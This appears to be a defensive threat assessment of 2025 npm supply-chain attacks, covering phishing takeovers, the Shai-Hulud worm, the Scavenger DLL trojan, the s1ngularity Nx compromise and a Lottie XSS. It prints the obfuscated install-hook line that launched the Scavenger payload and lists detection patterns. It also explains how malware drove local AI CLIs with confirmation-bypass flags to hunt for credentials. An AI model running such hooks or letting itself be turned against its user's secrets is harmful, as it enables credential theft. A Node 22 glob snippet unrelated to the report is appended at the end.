# **2025 npm Ecosystem Threat Assessment: A Comprehensive Audit of Supply Chain Compromises**

## **1\. Introduction: The Industrialization of Supply Chain Interdiction**

The calendar year 2025 represents a watershed moment in the security history of the JavaScript ecosystem. While previous years were characterized by opportunistic typosquatting and isolated account takeovers, 2025 witnessed the definitive industrialization of software supply chain attacks. Threat actors have successfully transitioned from peripheral targeting—attacking abandoned or low-usage packages—to the systemic interdiction of the ecosystem's critical infrastructure. This report, compiled as a foundational audit document for agentic development contexts, provides an exhaustive analysis of medium to high-profile attacks against the npm (Node Package Manager) registry throughout 2025\.

The prevailing trend of 2025 has been the weaponization of implicit trust relationships. The architecture of modern JavaScript development, which relies heavily on a deep graph of transitive dependencies, creates a fragile web of trust where a single compromised node can propagate malicious code to millions of downstream consumers. In 2025, attackers exploited this architecture not merely by compromising individual packages, but by deploying self-replicating worms (Shai-Hulud), exploiting the very build tools designed to secure code (Nx), and leveraging the identity of high-profile maintainers to bypass reputation-based filtering (the "Great Phishing" campaign).

Furthermore, 2025 introduced a novel dimension to supply chain security: the exploitation of Artificial Intelligence in the attack lifecycle. Attackers have begun to "live off the land" in a new way, weaponizing locally installed AI CLI tools to perform reconnaissance on developer machines, as seen in the "s1ngularity" campaign. Simultaneously, the rise of "Vibe Coding" platforms and AI-assisted development tools has introduced new attack vectors, where vulnerabilities in the AI infrastructure itself—such as the Base44 platform compromise—can bleed into the software supply chain.

For an autonomous auditing agent, this landscape presents a complex challenge. The definition of a "malicious" package has blurred; threats now reside within legitimate, highly trusted packages that have been temporarily subverted. The payloads are frequently isomorphic, designed to remain dormant in server-side CI/CD environments while executing devastating financial theft in the end-user's browser. This report dissects these incidents to provide the necessary context for effective attack surface curation.

**2\. The September 8th "Great Phishing" Campaign (Chalk/Debug Incident)**

Severity: Critical  
Date: September 8, 2025  
Primary Vector: Social Engineering / Phishing / 2FA Bypass  
Target: Core Utility Libraries / Transitive Dependencies

### **2.1 Operational Overview**

On September 8, 2025, the npm ecosystem experienced its most statistically significant compromise to date. In a highly coordinated campaign, threat actors targeted the maintainers of foundational utility libraries—packages that serve as the building blocks for the vast majority of JavaScript applications. By successfully compromising the account of a prolific maintainer known as qix, the attackers gained publishing rights to packages with billions of cumulative weekly downloads.1

This incident was notable not just for its scale, but for its method. The attackers did not exploit a vulnerability in the npm registry itself, nor did they use compromised SSH keys. Instead, they executed a flawlessly timed social engineering campaign that exploited the psychological urgency of security compliance. The resulting compromise allowed them to publish malicious versions of ubiquitous packages like chalk, debug, and ansi-styles, effectively injecting a crypto-drainer payload into the dependency trees of millions of projects worldwide.1

### **2.2 The Attack Vector: Weaponizing Compliance**

The campaign was initiated on September 4, 2025, with the registration of the fraudulent domain npmjs.help.4 This domain was designed to visually mimic the official npm support infrastructure with pixel-perfect accuracy. On September 8, the attackers dispatched targeted phishing emails to specific high-profile maintainers.

These emails were crafted to bypass the skepticism of technical users by mimicking the language and tone of official administrative correspondence. The subject lines claimed that a mandatory update to Two-Factor Authentication (2FA) settings was required by September 10, 2025, to avoid account lockout. This fabricated deadline created a sense of urgency, prompting victims to click the link provided in the email.4

Upon accessing the phishing site, victims were presented with a login interface that functioned as a Man-in-the-Middle (MitM) proxy. When the maintainer entered their credentials and, crucially, their One-Time Password (OTP), the phishing site relayed these values in real-time to the actual npm registry. This allowed the attackers to hijack the active session. Once authenticated, the attackers did not merely change the password; they generated new automation tokens. These tokens, which often bypass 2FA for subsequent actions, were then used to script the mass publication of malicious package versions.1

### **2.3 Affected Packages and versions**

The strategic selection of targets in this campaign reveals a deep understanding of the npm dependency graph. The attackers prioritized "transitive giants"—small, focused utility libraries that are rarely installed directly by application developers but are required by nearly every major framework and build tool. This ensures maximum propagation with minimal visibility.

### **2.4 Payload Forensic Analysis: The Browser-Based Drainer**

The technical sophistication of the payload lay in its execution context. Most supply chain attacks historically targeted the developer's machine (stealing SSH keys or environment variables during installation). However, the payload injected into these packages was designed to be **isomorphic** but active only in the browser.7

The malicious code was embedded within the package source, often obfuscated using hexadecimal encoding to evade static analysis. Upon execution, the code performed an environment check to determine if it was running in a browser context (checking for the existence of window and document objects). If the code detected a server-side Node.js environment, it remained dormant. This behavior was a deliberate evasion tactic designed to bypass CI/CD security scanners and runtime monitoring tools that typically focus on server-side behavior.1

If the environment check passed (i.e., the code was bundled into a web application and executed in a user's browser), the malware initiated its active phase. It hooked into critical browser APIs, specifically window.fetch and XMLHttpRequest, as well as Web3-specific objects like window.ethereum and Solana-specific globals. This hooking allowed the malware to intercept all network traffic and interactions with cryptocurrency wallets.1

The core functionality of the malware was a "wallet drainer" or transaction hijacker. It employed a Levenshtein distance algorithm—a string metric for measuring the difference between two sequences—to scan intercepted network payloads for strings resembling cryptocurrency addresses. The malware supported multiple chains, including Ethereum, Bitcoin, Litecoin, Tron, and Solana. When it identified a target address in a pending transaction, it would replace that address with an attacker-controlled address that visually resembled the original (e.g., matching the first and last few characters). This technique is designed to fool users who perform spot-checks on addresses before confirming transactions.1

### **2.5 Ecosystem Impact and Remediation**

The blast radius of this attack was enormous, potentially affecting any web application that updated its dependencies or ran a fresh build between September 8, 2025, and the remediation actions taken by npm. Although the malicious versions were live for only approximately two hours, the sheer volume of automated build pipelines meant that thousands of applications potentially bundled the malicious code.1

The response from the npm security team was swift. They revoked the compromised tokens and unpublished the malicious versions. However, due to the nature of caching in package managers (yarn, npm) and CDNs (Content Delivery Networks), the malicious artifacts persisted in some private registries and caches. Remediation required developers to not only update their package.json but to actively purge their lockfiles (package-lock.json, yarn.lock), delete their node\_modules directories, and clear their package manager caches to ensure the removal of the tainted code.1

For an auditing agent, this incident underscores the critical necessity of validating package-lock.json integrity against known compromised hashes. It also highlights the danger of "isomorphic" libraries; a vulnerability in a dev-tool like chalk can, through bundling, become a vulnerability in the production frontend.

**3\. The "Shai-Hulud" Self-Replicating Worm (Waves 1 & 2\)**

Severity: Critical  
Date: September 14, 2025 (Wave 1\) / November 24, 2025 (Wave 2\)  
Primary Vector: Self-Replicating Worm via Lifecycle Scripts  
Target: Ecosystem-wide Propagation / Credential Theft

### **3.1 Operational Overview**

If the September 8th attack was a targeted strike, the "Shai-Hulud" campaign was a contagion. Named after the colossal sandworms from Frank Herbert's *Dune* universe, this malware represented a significant escalation in supply chain attack complexity: it was a **worm**. Unlike traditional supply chain attacks where the attacker manually publishes malicious versions, Shai-Hulud was designed to spread autonomously. Upon infecting a developer's workstation, it leveraged the developer's own credentials to publish infected versions of their packages, thereby creating a cascading chain of infection.3

The attack occurred in two distinct waves. The first wave, detected on September 14, 2025, infected approximately 180 packages. The second, more aggressive wave began on November 24, 2025, compromising over 700 packages and introducing destructive "dead man's switch" capabilities.12

### **3.2 Wave 1: The Initial Outbreak (September 2025\)**

The initial wave served as a proof-of-concept for the worming capability. The infection vector relied on postinstall scripts—scripts defined in package.json that run automatically after a package is installed.

Mechanism of Propagation:  
When a developer installed an infected package (such as @ctrl/tinycolor or rxnt-authentication), the postinstall script executed the malware payload. The malware immediately scanned the developer's environment for sensitive files, specifically targeting .npmrc files which often contain authentication tokens for publishing to the npm registry. It also harvested GitHub Personal Access Tokens (PATs) and cloud credentials (AWS, GCP).3  
If a valid npm token was found, the worm queried the npm registry to enumerate all packages maintained by that authenticated user. It then downloaded the source code for those packages, injected the malicious payload (typically a file named bundle.js), added the postinstall hook to package.json, incremented the version number (patch bump), and published the new, infected version back to the registry. This automated republication allowed the worm to move laterally across the ecosystem without human intervention.14

**Key Affected Packages (Wave 1):**

* @ctrl/tinycolor: A widely used color manipulation library.  
* rxnt-authentication: Identified as a potential "Patient Zero" for this wave.  
* ngx-bootstrap: A popular Angular UI component library.  
* ng2-file-upload: A file upload directive for Angular.

### **3.3 Wave 2: "The Second Coming" (November 2025\)**

The second wave, self-identified in the malware's output as "Sha1-Hulud: The Second Coming," demonstrated a significant evolution in tactics. This variant was designed to be faster, stealthier, and more resilient to takedown efforts.

**Evolution of Tactics:**

1. **Shift to preinstall Execution:** The malware moved its execution trigger from postinstall to preinstall. This change was critical because preinstall scripts execute *before* dependencies are fully resolved and before many standard security audits can take place. The entry point was typically a script named setup\_bun.js.16  
2. **Abuse of the Bun Runtime:** The setup\_bun.js script downloaded and executed the **Bun** runtime. Bun is a legitimate, high-performance JavaScript runtime. By using Bun to execute the actual payload (bun\_environment.js), the attackers likely hoped to evade Endpoint Detection and Response (EDR) tools configured to monitor anomalous child processes spawned by node, but not necessarily bun.15  
3. **Destructive "Dead Man's Switch":** Perhaps the most alarming feature of Wave 2 was its destructive capability. The malware continuously monitored its connection to its exfiltration channels (GitHub and npm). If the malware detected that its access was blocked—for example, if the victim revoked their tokens or if the exfiltration repository was taken down—it triggered a wiper routine. On Windows systems, this routine attempted to delete the user's home directory, causing significant data loss.18  
4. **GitHub Actions Persistence:** The malware established persistence by registering the infected machine as a self-hosted GitHub Actions runner named SHA1HULUD. It then injected a malicious workflow file (.github/workflows/discussion.yaml) into the victim's repositories. This workflow contained a command injection vulnerability triggered by creating a GitHub Discussion, effectively allowing the attackers to execute arbitrary code on the victim's infrastructure at will.17

Key Affected Packages (Wave 2):  
The second wave impacted a broader set of high-profile packages, including integration tools and analytics libraries.

* posthog-node & posthog-js: Analytics libraries used by thousands of companies.  
* zapier-platform-core: The core SDK for building Zapier integrations.  
* @postman/tunnel-agent: Networking utility for Postman.  
* @asyncapi/specs: Specifications for the AsyncAPI initiative.  
* kill-port: A utility for killing processes on specific ports.

### **3.4 Forensic Indicators for Auditors**

For the agentic auditor, detecting Shai-Hulud requires a multi-faceted approach.

* **File Artifacts:** Presence of setup\_bun.js, bun\_environment.js, or bundle.js in the package root.  
* **Script Artifacts:** preinstall or postinstall scripts invoking the above files.  
* **Network Artifacts:** Outbound connections to GitHub repositories with descriptions containing "Sha1-Hulud" or "The Second Coming."  
* **Behavioral Artifacts:** Unexpected downloading or execution of the bun binary during npm install.

**4\. The "Scavenger" Campaign (eslint-config-prettier Incident)**

Severity: High  
Date: July 18-20, 2025  
Primary Vector: Phishing (Spoofed npnjs.com) / DLL Sideloading  
Target: Windows Development Environments

### **4.1 Operational Overview**

In July 2025, a highly targeted campaign focused on the maintainer of eslint-config-prettier. This package is a cornerstone of code quality tooling, used to resolve conflicts between ESLint rules and Prettier formatting. Its ubiquity in devDependencies made it an ideal vector for targeting developer workstations directly.

The attackers employed a classic typosquatting technique for the initial compromise, registering npnjs.com (replacing 'm' with 'n') to host a fraudulent login page. They phished the maintainer, JounQin, gaining access to their account.19

### **4.2 Payload Forensic Analysis: The "node-gyp.dll" Trojan**

The malware deployed in this campaign, dubbed "Scavenger," was distinct from the typical JavaScript-based stealers found in npm attacks. It specifically targeted the complexity of native module compilation in Node.js to hide a binary payload.

The malicious packages contained two key components:

1. **install.js:** A JavaScript file executed via a postinstall hook.  
2. **node-gyp.dll:** A file masquerading as a component of the legitimate node-gyp build tool.

The package.json was modified to execute node install.js. This script spawned a child process using the Windows utility rundll32.exe to execute the node-gyp.dll file. The command used obfuscated string concatenation to construct the execution call: require('chi' \+ 'ld\_pro' \+ 'cess')\['sp' \+ 'awn'\]("rundll32.exe./node-gyp.dll,main").20

Crucially, node-gyp.dll was **not** a legitimate DLL related to Node.js build processes. It was a PE32+ executable containing the Scavenger malware. Because node-gyp is a known and trusted component of the Node.js ecosystem (used for compiling C++ add-ons), the presence of a file with this name was intended to deceive developers and security tools inspecting the package contents.

### **4.3 Capabilities and Targeting**

The Scavenger malware was strictly **Windows-specific**. The use of rundll32.exe and the PE32+ binary format meant that Linux and macOS environments were unaffected by the payload, although they would still download the malicious package.

Once executed, Scavenger functioned as a sophisticated infostealer. It harvested:

* Browser data: Cookies, saved passwords, and history (targeting Chrome, Edge, and Firefox).  
* Development credentials: SSH keys, .npmrc tokens, and configuration files.  
* Communication tokens: Discord session tokens.  
* System information: Assessing the host for potential lateral movement.

The malware also employed anti-analysis techniques, including checks for virtual machine environments and encrypted string tables to hinder reverse engineering.19

Affected Packages:  
The following table lists the specific versions compromised in the Scavenger campaign.

| :---- | :---- | :---- |
| eslint-config-prettier | 8.10.1, 9.1.1, 10.1.6, 10.1.7 | \> 30,000,000 |
| eslint-plugin-prettier | 4.2.2, 4.2.3 | \> 20,000,000 |
| synckit | 0.11.9 | \> 20,000,000 |
| @pkgr/core | 0.2.8 | \> 15,000,000 |

For an auditing agent, the presence of rundll32 execution in an install script is a high-confidence Indicator of Compromise (IoC). Furthermore, any package containing a .dll file that is not explicitly a binary distribution for a native module should be treated with extreme suspicion.

**5\. The "s1ngularity" Nx Build System Attack**

Severity: Critical  
Date: August 26, 2025  
Primary Vector: CI/CD Configuration Exploit (pull\_request\_target)  
Target: Enterprise Build Systems / AI Tool Abuse

### **5.1 Operational Overview**

The "s1ngularity" campaign stands out because it targeted the supply chain of a supply chain tool. **Nx** is a widely adopted build system for monorepos, used by major enterprises to manage complex JavaScript and TypeScript codebases. Unlike the previous incidents which relied on phishing, this attack exploited a vulnerability in the Nx project's own GitHub Actions configuration to steal publishing credentials.22

### **5.2 The Attack Vector: CI/CD Misconfiguration**

The attackers exploited a subtle but dangerous misconfiguration in the Nx repository's GitHub Actions workflows. The workflow utilized the pull\_request\_target trigger. Unlike the standard pull\_request trigger, which runs in the context of the fork (and thus has read-only access), pull\_request\_target runs in the context of the base repository, granting it access to secrets.

The attackers submitted a Pull Request with a carefully crafted title containing a Bash injection payload. Because the workflow script interpolated the PR title directly into a shell command without sufficient sanitization, the injection executed. This allowed the attackers to dump the NPM\_TOKEN environment variable, giving them the ability to publish valid, signed packages under the @nrwl and @nx scopes.23

### **5.3 Payload Forensic Analysis: Weaponizing Local AI**

The malicious packages published using the stolen token (including nx, @nx/devkit, and @nx/js) contained a postinstall script named telemetry.js. While the name suggested benign data collection, the script contained a novel reconnaissance capability: it attempted to weaponize the developer's own AI tools.

The malware checked the environment for the presence of CLI tools associated with Large Language Models (LLMs), specifically looking for **Claude** and **Gemini** CLIs. If found, the script attempted to invoke these tools using flags like \--trust-all-tools or \--yolo (flags that bypass confirmation prompts). The malware instructed the AI agent to recursively scan the developer's filesystem for sensitive files—specifically searching for keywords like "secret," "key," "password," "config," and "token." It effectively turned the developer's AI assistant into a highly intelligent, semantic grep tool for finding credentials.25

The gathered data was then base64 encoded and exfiltrated to public GitHub repositories created under the victim's own account, named s1ngularity-repository. The malware also attempted to modify shell configuration files (.bashrc, .zshrc) to establish persistence.26

**Affected Packages:**

* nx / @nrwl/nx: Versions 20.9.0 – 21.8.0  
* @nx/devkit: Versions 20.9.0, 21.5.0  
* @nx/enterprise-cloud: Version 3.2.0  
* @nx/eslint: Version 21.5.0  
* @nx/js: Version 20.9.0

This incident is particularly relevant for the agentic development session. It demonstrates that local AI agents are now part of the attack surface. An auditor must verify that the environment does not grant unrestricted filesystem access to AI tools and that dependencies do not attempt to invoke these tools.

**6\. The LottieFiles Front-End Attack**

Severity: High  
Date: June 20, 2025 (CoinMarketCap Incident) / October 30, 2024 (LottieFiles npm compromise)  
Primary Vector: Compromised Developer Token / XSS via JSON  
Target: End-Users (Crypto Wallets)

### **6.1 Operational Overview**

The vulnerability in the **LottieFiles** ecosystem highlights the risks associated with "data-as-code." Lottie is a library for rendering animations exported as JSON files. While ostensibly a data format, the Lottie specification allows for "expressions"—embedded JavaScript code used to calculate animation values dynamically.

### **6.2 Mechanism and Real-World Impact**

On October 30, 2024 (impacting the 2025 landscape via lingering versions and subsequent exploitations), the @lottiefiles/lottie-player package (versions 2.0.5, 2.0.6, 2.0.7) was compromised via a stolen developer token. The malicious versions contained code that injected a fake "Connect Wallet" popup into any website using the player.27

However, a more sophisticated variation of this attack was observed on June 20, 2025, targeting **CoinMarketCap**. Attackers did not compromise the website's code directly. Instead, they compromised the supply chain of the "doodles" (animations) displayed on the homepage. They submitted a malicious Lottie JSON file ("CoinmarketCLAP") that utilized the Lottie expression engine.

The vulnerability lay in ExpressionManager.js within the lottie-web library, which used the dangerous eval() function to parse expressions found in the JSON. The attackers embedded a malicious payload within the x property of the JSON structure. When the animation loaded in the user's browser, eval() executed the payload, triggering a Cross-Site Scripting (XSS) attack. This script displayed a deceptive "Verify Wallet" prompt, draining the wallets of users who connected.27

### **6.3 Audit Implication**

This incident proves that supply chain attacks can be delivered via content files, not just code files. An auditor must ensure that any library parsing complex formats (JSON, XML, PDF) is pinned to a secure version. For Lottie specifically, it is critical to disable the expression engine (lottie.useExpression \= false) if it is not strictly required.

**7\. The Long Tail: Typosquatting, Impersonation, and Platform Risks**

While the targeted campaigns captured headlines, 2025 also saw a massive volume of automated, lower-tier attacks that pose a persistent risk to developers.

### **7.1 The "elf-stats" and "Spam" Campaigns**

Throughout late 2025 (October–December), researchers identified a massive campaign involving over 420 unique malicious packages. These packages typically followed a naming convention of elf-stats-\* (e.g., elf-stats-starlit-mitten, elf-stats-rooftop-stockpile).

These packages were generated using AI to create plausible-looking names and metadata, mimicking the appearance of legitimate analytics or utility libraries. The payload was a simple reverse shell or exfiltration script connecting to Pipedream endpoints. This campaign highlights the "noise" in the ecosystem; an auditor must be wary of any package with low download counts, recent creation dates, and generated-sounding descriptions.15

### **7.2 The "express-cookie-parser" Impersonation**

In July 2025, a malicious package named express-cookie-parser was published, impersonating the legitimate and widely used cookie-parser middleware. The package mirrored the README.md of the original to deceive developers.

The malicious code was hidden in a file named cookie-loader.min.js. It used ZLib compression and Base64 encoding to obfuscate a downloader script. This script calculated a Command and Control (C2) URL using a Domain Generation Algorithm (DGA) based on a hardcoded seed, ensuring resilience against domain blocking. It also attempted to establish persistence by dropping a startup.js file into the Chrome user data directory, aiming to infect the browser environment permanently.29

### **7.3 The Base44 "Vibe Coding" Vulnerability**

While not a direct npm package compromise, the July 2025 incident involving **Base44**—a popular "Vibe Coding" (AI-assisted no-code) platform owned by Wix—demonstrates the risks of the new development stack. A critical authentication bypass vulnerability allowed unauthenticated attackers to access private applications and internal chatbots built on the platform. Because these platforms often integrate with npm to pull dependencies, a compromise here allows attackers to inject malicious code into the generated applications, effectively poisoning the supply chain one step upstream from the package registry.30

### **7.4 Legacy Risks: body-parser Denial of Service**

In addition to active malware, 2025 saw the disclosure of a significant vulnerability in body-parser (CVE-2025-13466). Version 2.2.0 was found to be vulnerable to Denial of Service (DoS) due to inefficient handling of URL-encoded bodies with large numbers of parameters. While not a malicious injection, this vulnerability in a critical dependency (used by Express.js) represents a significant availability risk that must be audited.32

**8\. Strategic Audit Guidelines for Agentic Development**

Based on the forensic analysis of the 2025 threat landscape, the following audit protocol is recommended for the agentic development session. The auditor must assume that the supply chain is hostile and that "trusted" packages may be temporarily compromised.

### **8.1 Dependency Pinning and Integrity Verification**

* **Protocol:** Enforce strict version pinning. Remove all carets (^) and tildes (\~) from package.json to prevent the automatic installation of compromised patch versions (as seen in the September 8th campaign).  
* **Validation:** Verify package-lock.json against known compromised hashes. Ensure that no package resolves to the malicious versions listed in the tables above.  
* **Source of Truth:** Do not trust the package metadata alone. Verify the integrity of the tarball against the registry signature.

### **8.2 Lifecycle Script Analysis**

* **Heuristic:** Flag any package containing preinstall or postinstall scripts. The Shai-Hulud and Scavenger campaigns heavily relied on these hooks.  
* **Specific Patterns:**  
  * **Binary Execution:** Look for rundll32, powershell, or execution of unknown .dll or .exe files (Scavenger).  
  * **Runtime Switching:** Look for scripts that download or execute bun (Shai-Hulud Wave 2).  
  * **Obfuscation:** Flag any script containing high-entropy strings, eval(), or unreadable code blocks.

### **8.3 Context-Aware Security**

* **Browser/Server Isolation:** For isomorphic packages (like debug or chalk), verify that the build process correctly tree-shakes unused code. Ensure that server-side dependencies do not leak into the client bundle where a "wallet drainer" payload could execute.  
* **AI Tool Sandboxing:** Ensure that the development environment does not grant AI CLI tools (Claude, Gemini) unrestricted access to the filesystem. The s1ngularity attack proved that these tools can be weaponized for reconnaissance.

### **8.4 Configuration Hygiene**

* **CI/CD Triggers:** Audit GitHub Actions workflows for the usage of pull\_request\_target. If present, ensure it is strictly isolated and does not have access to secrets.  
* **Secret Scoping:** Verify that npm automation tokens are granularly scoped and do not have blanket publish permissions.

By adhering to these guidelines, the agentic auditor can effectively curate the attack surface, mitigating the risks posed by the industrialized supply chain threats of 2025\. The shift from simple vulnerability management to active threat hunting within the dependency graph is no longer optional; it is the baseline for secure development.

## Dependency Minimization: Native Node 22 APIs

### Drop `glob` for `fs.glob`

Node 22 ships `fs.glob()` natively:
```typescript
// Old (with glob package)
import { glob } from 'glob';
const files = await glob('**/*.ts');

// New (Node 22 native)
import { glob } from 'node:fs/promises';
const files = [];
for await (const file of glob('**/*.ts')) {
  files.push(file);
}
```
